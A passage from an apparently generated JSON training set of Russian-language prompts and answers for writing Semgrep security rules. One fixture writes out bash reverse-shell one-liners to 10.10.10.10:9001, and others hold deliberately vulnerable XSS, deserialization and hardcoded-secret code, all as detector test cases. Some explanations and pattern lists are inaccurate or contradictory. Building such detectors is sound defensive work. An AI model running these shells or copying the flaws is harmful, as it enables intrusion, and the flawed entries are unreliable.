    "output": "rules:\n  - id: function-use-after-free\n    patterns:\n      - pattern-either:\n        - pattern: $FUNC(..., <... $VAR ...>, ...)\n        - pattern: $FUNC(..., <... $VAR->$ACCESSOR ...>, ...)\n        - pattern: $FUNC(..., <... (*$VAR).$ACCESSOR ...>, ...)\n        - pattern: $FUNC(..., <... $VAR[$NUM] ...>, ...)\n      - metavariable-regex:\n          metavariable: $FUNC\n          regex: (?!^free$)\n      - pattern-inside:\n          free($VAR);\n          ...\n      - pattern-not-inside:\n          free($VAR);\n          ...\n          $VAR = NULL;\n          ...\n      - pattern-not-inside:\n          free($VAR);\n          ...\n          $VAR = malloc(...);\n          ...\n    message: Variable '$VAR' was passed to a function after being freed. This can lead to undefined behavior.\n    metadata:\n      cwe:\n        - \"CWE-416: Use After Free\"\n      references:\n        - https://cwe.mitre.org/data/definitions/416.html\n        - https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free/\n      category: security\n      technology:\n        - c\n      confidence: LOW\n      cwe2022-top25: true\n      cwe2021-top25: true\n      subcategory:\n        - vuln\n      likelihood: LOW\n      impact: HIGH\n    languages:\n      - c\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменной ($VAR) после ее освобождения (функции free()). Анализ выполняется путем сопоставления вызовов функций ($FUNC), принимающих аргументы, содержащие освобожденные переменные или указатели на них. Правило учитывает различные способы обращения к освобожденной памяти, включая доступ через указатель, массивный индекс и косвенный доступ через структуру. Также учитываются случаи, когда освобождение происходит не непосредственно перед использованием, но достаточно близко во времени и контексте, чтобы вызвать неопределенное поведение.\n\n# Ключевые элементы:\n- ID: function-use-after-free\n- Язык: c \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "function-use-after-free",
      "language": "c",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: template-unescaped-with-safe\nОписание уязвимости: Detected a segment of a Flask template where autoescaping is explicitly disabled with '| safe' filter. This allows rendering of raw HTML in this segment. Ensure no user data is rendered here, otherwise this is a cross-site scripting (XSS) vulnerability.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: template-unescaped-with-safe.html\n{% extends \"container.html\" %}\n\n{% block opengraph %}\n\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"website\" />\n<meta property=\"og:site_name\" content=\"semgrep\" />\n<meta property=\"og:description\" content=\"content\" />\n<!-- ruleid: template-unescaped-with-safe -->\n<meta property=\"og:image\" content=\"{{ url_for('static', filename='picture.jpg', _external=True) | safe }}\" />\n<meta property=\"og:image:type\" content=\"image/jpeg\" />\n<meta property=\"og:image:width\" content=\"600\" />\n<meta property=\"og:image:height\" content=\"600\" />\n<!-- ok -->\n<meta property=\"not-real-only-for-testing\" content=\"{{ safe }}\" />\n\n<!-- Google OAuth sign-in -->\n<meta name=\"google-signin-scope\" content=\"profile email openid\">\n<!-- ruleid: template-unescaped-with-safe -->\n<meta name=\"google-signin-client_id\" content=\"{{ client_id | safe }}\">\n\n<!-- ruleid: template-unescaped-with-safe -->\n<div>{{ var | safe }}</div>\n<!-- ruleid: template-unescaped-with-safe -->\n<div>{{var | safe }}</div>\n<!-- ruleid: template-unescaped-with-safe -->\n<div>{{var| safe }}</div>\n<!-- ruleid: template-unescaped-with-safe -->\n<div>{{var|safe }}</div>\n<!-- ruleid: template-unescaped-with-safe -->\n<div>{{var|safe}}</div>\n<!-- ruleid: template-unescaped-with-safe -->\n<div>{{ var | safe }}</div>\n<!-- ruleid: template-unescaped-with-safe -->\n<div>{{ var |safe }}</div>\n<!-- ruleid: template-unescaped-with-safe -->\n<div>{{ var|safe }}</div>\n\n{% endblock %}  # Ограничиваем длину\n\nОпасные паттерны:\n• {{ url_for('static', filename='picture.jpg', _external=True) | safe }}\n• {{ client_id | safe }}\n• {{ var | safe }}\n\nБезопасные паттерны:  \n• {{ safe }}\n• {{ not-real-only-for-testing }}\n\nЛегенда аннотаций:\n- // ruleid:template-unescaped-with-safe: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:template-unescaped-with-safe: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: template-unescaped-with-safe\n  message: >-\n    Detected a segment of a Flask template where autoescaping is explicitly\n    disabled with '| safe' filter. This allows rendering of raw HTML\n    in this segment. Ensure no user data is rendered here, otherwise this\n    is a cross-site scripting (XSS) vulnerability.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://flask.palletsprojects.com/en/1.1.x/security/#cross-site-scripting-xss\n    category: security\n    technology:\n    - flask\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - regex\n  paths:\n    include:\n    - '*.html'\n  severity: WARNING\n  pattern-regex: '{{.*?\\|\\s*safe(\\s*}})?'\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска шаблонов в Flask-шаблонах, где отключено автоматическое экранирование с использованием фильтра 'safe'. Правило ищет конструкции вида {{ expression | safe }}, которые могут привести к отображению необработанного HTML-кода и потенциальной уязвимости XSS. Шаблоны паттернов включают варианты написания фильтра 'safe' с пробелами или без них, а также различные способы форматирования выражения внутри шаблона.\n\n# Ключевые элементы:\n- ID: template-unescaped-with-safe\n- Язык: regex \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "template-unescaped-with-safe",
      "language": "regex",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: bash_reverse_shell\nОписание уязвимости: Semgrep found a bash reverse shell\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: bash-reverse-shell.generic\n# ruleid: bash_reverse_shell\nsh -i >& /dev/udp/10.10.10.10/9001 0>&1\n\n# ruleid: bash_reverse_shell\n0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196\n\n# ruleid: bash_reverse_shell\nexec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done\n\n# ruleid: bash_reverse_shell\nsh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5  # Ограничиваем длину\n\nОпасные паттерны:\n• sh -i >& /dev/udp/10.10.10.10/9001 0>&1\n• 0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196\n• exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done\n\nБезопасные паттерны:  \n• command -v ssh && ssh user@host\n• curl https://example.com/file.txt\n• bash --version\n\nЛегенда аннотаций:\n- // ruleid:bash_reverse_shell: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:bash_reverse_shell: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: bash_reverse_shell\n  metadata:\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    category: security\n    technology:\n    - ci\n    confidence: HIGH\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    subcategory:\n    - audit\n    likelihood: MEDIUM\n    impact: HIGH\n  message: Semgrep found a bash reverse shell\n  severity: ERROR\n  languages:\n  - generic\n  pattern-either:\n  - pattern: |\n      sh -i >& /dev/udp/.../... 0>&1\n  - pattern: |\n      <...>/dev/tcp/.../...; sh <&... >&... 2>&\n  - pattern: |\n      <...>/dev/tcp/.../...; cat <&... | while read line; do $line 2>&... >&...;done\n  - pattern: |\n      sh -i ...<...> /dev/tcp/.../... ...<&... 1>&... 2>&\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска шаблонов команд в Bash, которые могут использоваться для создания обратных шеллов. Анализ выполняется путем поиска строк, содержащих команды, запускаемые через 'sh', перенаправляющие стандартный ввод/вывод через сетевые соединения UDP или TCP, что является типичным поведением при создании обратных шеллов. Правило использует оператор 'pattern-either' для объединения нескольких шаблонов, каждый из которых соответствует различным способам реализации обратных шеллов.\n\n# Ключевые элементы:\n- ID: bash_reverse_shell\n- Язык: generic \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "bash_reverse_shell",
      "language": "generic",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: gcp-sql-database-ssl-insecure-value-postgres-mysql\nОписание уязвимости: Ensure all Cloud SQL database instance require incoming connections to use SSL. To enable this for PostgresSQL and MySQL, use `ssl_mode=\"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"`.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-sql-database-ssl-insecure-value-postgres-mysql.tf\n# ok: gcp-sql-database-ssl-insecure-value-postgres-mysql\nresource \"google_sql_database_instance\" \"fail\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  settings {\n    tier = \"db-f1-micro\"\n  }\n}\n\n# ok: gcp-sql-database-ssl-insecure-value-postgres-mysql\nresource \"google_sql_database_instance\" \"success\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  ip_configuration {\n      ipv4_enabled = true\n      require_ssl = true\n  }\n}\n\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      # ok: gcp-sql-database-ssl-insecure-value-postgres-mysql\n      ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      # ok: gcp-sql-database-ssl-insecure-value-postgres-mysql\n      ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      # ruleid: gcp-sql-database-ssl-insecure-value-postgres-mysql\n      ssl_mode = \"ENCRYPTED_ONLY\"\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"main\" {\n  name      = \"some-example-name\"\n  database_version  = \"POSTGRES_15\"\n  region      = \"europe-west3\"\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      # ruleid: gcp-sql-database-ssl-insecure-value-postgres-mysql\n      ssl_mode = \"ALLOW_UNENCRYPTED_AND_ENCRYPTED\"\n    }\n  }\n}\n\nresource \"google_sql_database_instance\" \"mysql_  # Ограничиваем длину\n\nОпасные паттерны:\n• ssl_mode = \"ENCRYPTED_ONLY\"\n• ssl_mode = \"ALLOW_UNENCRYPTED_AND_ENCRYPTED\"\n• ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\" # ruleid: gcp-sql-database-ssl-insecure-value-postgres-mysql\n\nБезопасные паттерны:  \n• ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n• ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\" # ok: gcp-sql-database-ssl-insecure-value-postgres-mysql\n\nЛегенда аннотаций:\n- // ruleid:gcp-sql-database-ssl-insecure-value-postgres-mysql: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-sql-database-ssl-insecure-value-postgres-mysql: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-sql-database-ssl-insecure-value-postgres-mysql\n  patterns:\n  - pattern-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n          database_version = \"$DB\"\n          ...\n      }\n  - pattern-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n          ip_configuration {\n              ...\n              ssl_mode = $VALUE\n              ...\n          }\n          ...\n      }\n  - pattern-not-inside: |\n      resource \"google_sql_database_instance\" \"...\" {\n          ...\n          ip_configuration {\n              ...\n              ssl_mode = \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n              ...\n          }\n          ...\n      }\n  - metavariable-regex:\n      metavariable: $DB\n      regex:  .*(MYSQL|POSTGRES).*\n  - focus-metavariable: $VALUE\n  fix: |\n    \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"\n  message: >-\n    Ensure all Cloud SQL database instance require incoming connections to use SSL. To enable this for PostgresSQL and MySQL, use `ssl_mode=\"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\"`.\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - \"https://cloud.google.com/sql/docs/postgres/admin-api/rest/v1/instances#ipconfiguration\"\n    - \"https://owasp.org/Top10/A02_2021-Cryptographic_Failures\"\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Cloud SQL Database Instance, где атрибут ssl_mode не установлен в значение \"TRUSTED_CLIENT_CERTIFICATE_REQUIRED\". Анализ выполняется путем проверки наличия ресурса google_sql_database_instance с атрибутом ssl_mode внутри блока ip_configuration. Правило также исключает случаи, когда ssl_mode уже установлен в требуемое значение. Используется метапеременная $DB для фильтрации по базам данных PostgreSQL и MySQL.\n\n# Ключевые элементы:\n- ID: gcp-sql-database-ssl-insecure-value-postgres-mysql\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-sql-database-ssl-insecure-value-postgres-mysql",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: is-function-without-parentheses\nОписание уязвимости: Is \"$FUNC\" a function or an attribute? If it is a function, you may have meant $X.$FUNC() because $X.$FUNC is always true.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: is-function-without-parentheses.py\nclass MyClass:\n  some_attr = 3\n  def is_positive(self):\n    return self.some_attr > 0\n\nexample = MyClass()\n# ok:is-function-without-parentheses\nexample.is_positive()\n# ruleid:is-function-without-parentheses\nif (example.is_positive):\n  do_something()\n# ok:is-function-without-parentheses\nelif (example.some_attr):\n  do_something_else()\nelse:\n  return  # Ограничиваем длину\n\nОпасные паттерны:\n• if (example.is_positive):\n• condition = example.is_active\n\nБезопасные паттерны:  \n• example.is_positive()\n• example.is_active(True)\n\nЛегенда аннотаций:\n- // ruleid:is-function-without-parentheses: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:is-function-without-parentheses: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: is-function-without-parentheses\n    languages:\n      - python\n    message:\n      Is \"$FUNC\" a function or an attribute? If it is a function, you may have meant $X.$FUNC() because $X.$FUNC is always\n      true.\n    patterns:\n      - pattern: $X.$FUNC\n      - pattern-not-inside: $X.$FUNC(...)\n      - metavariable-regex:\n          metavariable: $FUNC\n          regex: is_.*\n    severity: WARNING\n    metadata:\n      category: maintainability\n      technology:\n        - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций без круглых скобок в Python. Оно использует два шаблона: первый шаблон ищет любой атрибут, заканчивающийся на 'is_' (метавариабельная регулярка), второй шаблон исключает случаи, когда этот атрибут вызывается с аргументами внутри круглых скобок. Правило предупреждает о возможной ошибке, так как отсутствие круглых скобок может привести к интерпретации атрибута как функции, что не всегда верно.\n\n# Ключевые элементы:\n- ID: is-function-without-parentheses\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "is-function-without-parentheses",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: aws-codebuild-artifacts-unencrypted\nОписание уязвимости: The CodeBuild project artifacts are unencrypted. All artifacts produced by your CodeBuild project pipeline should be encrypted to prevent them from being read if compromised.\nCWE: CWE-311: Missing Encryption of Sensitive Data\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-311: Missing Encryption of Sensitive Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-codebuild-artifacts-unencrypted.tf\nresource \"aws_codebuild_project\" \"fail_1\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-codebuild-artifacts-unencrypted\n  artifacts {\n    encryption_disabled = true\n    type                = \"CODEPIPELINE\"\n  }\n\n  environment {\n    compute_type = \"BUILD_GENERAL1_SMALL\"\n    image        = \"aws/codebuild/standard:1.0\"\n    type         = \"LINUX_CONTAINER\"\n  }\n\n  source {\n    type            = \"GITHUB\"\n    location        = \"https://github.com/mitchellh/packer.git\"\n    git_clone_depth = 1\n\n    git_submodules_config {\n      fetch_submodules = true\n    }\n  }\n}\n\nresource \"aws_codebuild_project\" \"fail_2\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-codebuild-artifacts-unencrypted\n  artifacts {\n    encryption_disabled = true\n    type                = \"S3\"\n  }\n\n  environment {\n    compute_type = \"BUILD_GENERAL1_SMALL\"\n    image        = \"aws/codebuild/standard:1.0\"\n    type         = \"LINUX_CONTAINER\"\n  }\n\n  source {\n    type            = \"GITHUB\"\n    location        = \"https://github.com/mitchellh/packer.git\"\n    git_clone_depth = 1\n\n    git_submodules_config {\n      fetch_submodules = true\n    }\n  }\n}\n\nresource \"aws_codebuild_project\" \"fail_3\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-codebuild-artifacts-unencrypted\n  artifacts {\n    encryption_disabled = true\n    type                = \"CODEPIPELINE\"\n  }\n\n  environment {\n    compute_type = \"BUILD_GENERAL1_SMALL\"\n    image        = \"aws/codebuild/standard:1.0\"\n    type         = \"LINUX_CONTAINER\"\n  }\n\n  source {\n    type            = \"GITHUB\"\n    location        = \"https://github.com/mitchellh/packer.git\"\n    git_clone_depth = 1\n\n    git_submodules_config {\n      fetch_submodules = true\n    }\n  }\n}\n\nresource \"aws_codebuild_project\" \"fail_4\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-cod  # Ограничиваем длину\n\nОпасные паттерны:\n• artifacts { encryption_disabled = true type = \"CODEPIPELINE\" }\n• artifacts { encryption_disabled = true type = \"S3\" }\n• secondary_artifacts { artifact_identifier = \"example-artifact-1\" type = \"CODEPIPELINE\" encryption_disabled = true }\n\nБезопасные паттерны:  \n• artifacts { type = \"S3\" encryption_disabled = false }\n• secondary_artifacts { artifact_identifier = \"example-artifact-1\" type = \"CODEPIPELINE\" encryption_disabled = false }\n• secondary_artifacts { artifact_identifier = \"example-artifact-3\" type = \"S3\" encryption_disabled = false }\n\nЛегенда аннотаций:\n- // ruleid:aws-codebuild-artifacts-unencrypted: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-codebuild-artifacts-unencrypted: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-codebuild-artifacts-unencrypted\n  patterns:\n  - pattern-inside: |\n      resource \"aws_codebuild_project\" \"$ANYTHING\" {\n        ...\n      }\n  - pattern: |\n      $ARTIFACTS {\n        ...\n        type = \"$TYPE\"\n        encryption_disabled = true\n        ...\n      }\n  - metavariable-regex:\n      metavariable: $ARTIFACTS\n      regex: ^(artifacts|secondary_artifacts)$\n  - metavariable-regex:\n      metavariable: $TYPE\n      regex: ^(CODEPIPELINE|S3)$\n  message: The CodeBuild project artifacts are unencrypted. All artifacts produced\n    by your CodeBuild project pipeline should be encrypted to prevent them from being\n    read if compromised.\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-311: Missing Encryption of Sensitive Data'\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-codebuild-project-artifacts.html\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS CodeBuild проекта, у которых отключена шифрация артефактов. Анализ выполняется путем поиска ресурса 'aws_codebuild_project' и последующего сопоставления блока 'artifacts' или 'secondary_artifacts', где атрибут 'encryption_disabled' установлен в true и тип артефакта ('type') равен 'CODEPIPELINE' или 'S3'. Правило использует метавариабли для обобщения имен переменных и регулярных выражений для проверки типов артефактов.\n\n# Ключевые элементы:\n- ID: aws-codebuild-artifacts-unencrypted\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-codebuild-artifacts-unencrypted",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: avoid-jsonpickle\nОписание уязвимости: Avoid using `jsonpickle`, which is known to lead to code execution vulnerabilities. When unpickling, the serialized data could be manipulated to run arbitrary code. Instead, consider serializing the relevant data using `json` module.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-jsonpickle.py\nimport jsonpickle\n\ndef run_payload(payload: str) -> None:\n    # ruleid: avoid-jsonpickle\n    obj = jsonpickle.decode(payload)\n\ndef ok():\n    # ok: avoid-jsonpickle\n    obj = jsonpickle.decode('foobar')  # Ограничиваем длину\n\nОпасные паттерны:\n• import jsonpickle\ndef run_payload(payload: str) -> None:\n    # ruleid: avoid-jsonpickle\n    obj = jsonpickle.decode(payload)\n• import jsonpickle\nobj = jsonpickle.decode(user_input)\n\nБезопасные паттерны:  \n• import jsonpickle\n# ok: avoid-jsonpickle\nobj = jsonpickle.decode('foobar')\n• import jsonpickle\npayload = 'valid_data'\nobj = jsonpickle.decode(payload)\n\nЛегенда аннотаций:\n- // ruleid:avoid-jsonpickle: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-jsonpickle: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-jsonpickle\n  patterns:\n  - pattern: |\n      jsonpickle.decode($PAYLOAD,...)\n  - pattern-not: |\n      jsonpickle.decode(\"...\",...)\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://github.com/jsonpickle/jsonpickle#jsonpickle\n    - https://www.exploit-db.com/exploits/49585\n    category: security\n    technology:\n    - jsonpickle\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  message: >-\n    Avoid using `jsonpickle`, which is known to lead to code execution vulnerabilities.\n    When unpickling, the serialized data could be manipulated to run arbitrary code.\n    Instead, consider serializing the relevant data using `json` module.\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования библиотеки jsonpickle в Python-коде. Оно ищет вызов функции decode из модуля jsonpickle с передачей переменной ($PAYLOAD), которая может быть не проверена или передана извне. Вторым условием является исключение случаев, когда строка передается напрямую в функцию decode ('...',...). Это позволяет избежать ложных срабатываний при использовании жестко закодированных значений.\n\n# Ключевые элементы:\n- ID: avoid-jsonpickle\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-jsonpickle",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения hardcoded-secret-rsa-passphrase\nОписание уязвимости: Found the use of an hardcoded passphrase for RSA. The passphrase can be easily discovered, and therefore should not be stored in source-code. It is recommended to remove the passphrase from source-code, and use system environment variables or a restricted configuration file.\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: hardcoded-secret-rsa-passphrase.rb\nmodule Test\n\n  require 'openssl'\n\n  class Test\n    $pass = 'super secret'\n\n    def initialize(key = nil, iv = nil)\n      @pass1 = 'my secure pass phrase goes here'\n      @keypem = 'foo.pem'\n      #ruleid: hardcoded-secret-rsa-passphrase\n      OpenSSL::PKey::RSA.new(1024).to_pem(cipher, \"secret\")\n      bad\n      bad1\n      bad2\n      bad3\n      ok\n    end\n\n\n    def bad\n      key_pem = File.read @keypem\n      #ruleid: hardcoded-secret-rsa-passphrase\n      key = OpenSSL::PKey::RSA.new key_pem, $pass\n    end\n\n    def bad1\n      key_pem = File.read @keypem\n      #ruleid: hardcoded-secret-rsa-passphrase\n      key = OpenSSL::PKey::RSA.new key_pem, @pass1\n      $bad0 = 'secret'\n    end\n\n    def bad2\n      key_pem = File.read @keypem\n      #ruleid: hardcoded-secret-rsa-passphrase\n      key = OpenSSL::PKey::RSA.new key_pem, 'secret'\n      #ruleid: hardcoded-secret-rsa-passphrase\n      key = OpenSSL::PKey::RSA.new key_pem, $bad0\n    end\n\n    def bad3\n      ca_key = OpenSSL::PKey::RSA.new 2048\n      pass_phrase = 'my secure pass phrase goes here'\n      cipher = OpenSSL::Cipher.new 'AES-256-CBC'\n      #ruleid: hardcoded-secret-rsa-passphrase\n      ca_key.export(cipher, pass_phrase)\n      open 'tmp/ca_key.pem', 'w', 0644 do |io|\n        #ruleid: hardcoded-secret-rsa-passphrase\n        io.write ca_key.export(cipher, pass_phrase)\n        #ruleid: hardcoded-secret-rsa-passphrase\n        io.write ca_key.export(cipher, $pass)\n        #ruleid: hardcoded-secret-rsa-passphrase\n        io.write ca_key.export(cipher, @pass1)\n      end\n    end\n\n    def ok\n      key_pem = File.read @keypem\n      #ok: hardcoded-secret-rsa-passphrase\n      key = OpenSSL::PKey::RSA.new key_pem, ENV['SECRET']\n    end\n  end\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• key = OpenSSL::PKey::RSA.new key_pem, $pass\n• key = OpenSSL::PKey::RSA.new key_pem, 'secret'\n• ca_key.export(cipher, 'my secure pass phrase goes here')\n\nБезопасные паттерны:  \n• key = OpenSSL::PKey::RSA.new key_pem, ENV['SECRET']\n• io.write ca_key.export(cipher, ENV['SECRET'])\n\nЛегенда аннотаций:\n- // ruleid:hardcoded-secret-rsa-passphrase: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hardcoded-secret-rsa-passphrase: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
